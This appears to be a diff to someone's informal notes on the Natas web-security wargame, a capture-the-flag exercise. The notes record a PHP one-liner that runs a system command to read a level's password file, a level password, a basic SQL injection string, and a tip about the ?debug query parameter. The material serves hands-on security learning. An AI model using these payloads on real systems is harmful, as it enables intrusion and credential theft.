@@ -110,3 +110,9 @@ php just dont care it just fine <?php ?> to run\
 `<?php system('cat /etc/natas_webpass/natas14'); ?>`
 
 #### l15.GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
+base sqlInjectiong ` “ OR 1=1 -- ` to get a false OR ture commmentize to ignore\
+```
+? in a url are for query string
+?debug are for GET("debug")
+<input type="hidden" name="debug" value="1"> in F12, but just typing ?debug in the URL is much faster
+```
